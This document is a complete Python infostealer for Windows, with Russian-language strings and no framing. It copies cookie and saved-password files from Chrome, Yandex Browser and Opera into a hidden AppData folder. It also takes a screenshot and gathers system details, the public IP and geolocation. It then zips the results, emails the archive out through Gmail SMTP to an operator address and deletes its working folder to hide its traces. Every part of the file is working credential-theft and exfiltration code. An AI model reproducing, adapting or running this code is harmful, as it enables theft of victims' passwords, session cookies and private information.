import getpass
import os
import shutil
import subprocess
import zipfile
import sys
import time
import win32api
import platform
import requests
import ip2geotools
import smtplib
from PIL import ImageGrab
from ip2geotools.databases.noncommercial import DbIpCity
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

user = getpass.getuser()

sender = ""
receiver = ""
password = ""

try:
    os.mkdir(rf"C:\\Users\\{user}\\AppData\\files")
    subprocess.call(['attrib', '+h', rf"C:\\Users\\{user}\\AppData\\files"])
    os.mkdir(rf"C:\\Users\\{user}\\AppData\\files\\results")

    ChromeCookie = rf'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
    ChromePass = rf'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
    YandexCookie = rf'C:\\Users\\{user}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'
    YandexPass = rf'C:\\Users\\{user}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker'
    OperaCookie = rf'C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies'
    OperaPass = rf'C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
    Screen = rf'C:\\Users\\{user}\\AppData\\Roaming\\{user}-sreenshot.jpg'
    Path = rf"C:\\Users\\{user}\\AppData\\files\\results"

    if (os.path.exists(ChromeCookie)) == True:
        os.mkdir(Path + r"\\Chrome")
        shutil.copyfile(ChromeCookie, Path + r"\\Chrome\\Google Chrome Cookie", follow_symlinks=True)

    if (os.path.exists(ChromePass)) == True:
        if not os.path.exists(Path + r"\\Chrome"):
            os.mkdir(Path + r"\\Chrome")
        shutil.copyfile(ChromePass, Path + r"\\Chrome\\Google Chrome Passwords", follow_symlinks=True)

    if (os.path.exists(YandexCookie)) == True:
        os.mkdir(Path + r"\\Yandex")
        shutil.copyfile(YandexCookie, Path + r"\\Yandex\\Yandex Browser cookie", follow_symlinks=True)

    if (os.path.exists(YandexPass)) == True:
        if not os.path.exists(Path + r"\\Yandex"):
            os.mkdir(Path + r"\\Yandex")
        shutil.copyfile(YandexPass, Path + r"\\Yandex\\Yandex Browser passwords", follow_symlinks=True)

    if (os.path.exists(OperaCookie)) == True:
        os.mkdir(Path + r"\\Opera")
        shutil.copyfile(OperaCookie, Path + r"\\Opera\\Opera Cookie", follow_symlinks=True)

    if (os.path.exists(OperaPass)) == True:
        if not os.path.exists(Path + r"\\Opera"):
            os.mkdir(Path + r"\\Opera")
        shutil.copyfile(OperaPass, Path + r"\\Opera\\Opera Passwords", follow_symlinks=True)

    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + rf'\\{user}-sreenshot.jpg')
    if (os.path.exists(Screen)) == True:
        os.mkdir(Path + r"\\Screen")
        shutil.copyfile(Screen, Path + rf"\\Screen/{user}-sreenshot.jpg", follow_symlinks=True)

    d = str(win32api.GetLogicalDriveStrings())
    d = str(d.split('\000')[:-1])
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
    data = "Время: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: ' + requests.get(
        "https://ramziv.com/ip").text + '\nГород: ' + response.city + '\nGen_Location:' + response.to_json() + '\nДиски:' + d
    os.mkdir(Path + rf"\\Info")
    file = open(Path + rf"\\Info\\{user}-info.txt", "w")
    file.write(data)
    file.close()

    directory_name = rf'C:\\Users\\{user}\\AppData\\files\\results'
    zip_name = rf'C:\\Users\\{user}\\AppData\\files\\{user}-st'

    shutil.make_archive(zip_name, 'zip', directory_name)

    subject = rf"Результаты парсинга {user}"
    body = "Ку"

    message = MIMEMultipart()
    message["From"] = sender
    message["To"] = receiver
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    file = rf'C:\\Users\\{user}\\AppData\\files\\{user}-st.zip'
    filename = rf'{user}-st.zip'

    with open(file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header("Content-Disposition", f"attachment; filename= {filename}", )

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender, password)
        server.sendmail(sender, receiver, text)

    shutil.rmtree(rf"C:\\Users\\{user}\\AppData\\files")
except Exception as e:
    print(repr(e))
